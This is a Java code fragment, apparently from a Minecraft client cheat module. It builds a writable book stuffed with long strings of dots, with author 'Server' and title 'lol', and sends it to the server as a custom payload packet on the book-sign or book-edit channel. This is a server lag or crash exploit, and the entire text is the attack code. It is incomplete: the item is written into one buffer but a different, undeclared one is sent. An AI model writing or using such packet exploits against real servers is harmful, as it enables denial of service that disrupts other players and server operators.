				NBTTagCompound page = new NBTTagCompound();
				NBTTagList list = new NBTTagList();
				String string = "";
				n2 = 0;
				while (n2 < 2100) {
					string = String.valueOf(string) + ".";
					n2++;
				}
				n2 = 0;
				while (n2 < 2) {
					list.appendTag(new NBTTagString(string));
					n2++;
				}
				page.setString("author", "Server");
				page.setString("title", "lol");
				page.setByte("resolved", (byte) 1);
				page.setTag("pages", list);
                ItemStack book = new ItemStack(Items.writable_book);
                book.setTagCompound(page);
                PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                pb.writeItemStackToBuffer(book);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload(isSign ? "MC|BSign" : "MC|BEdit", buffer));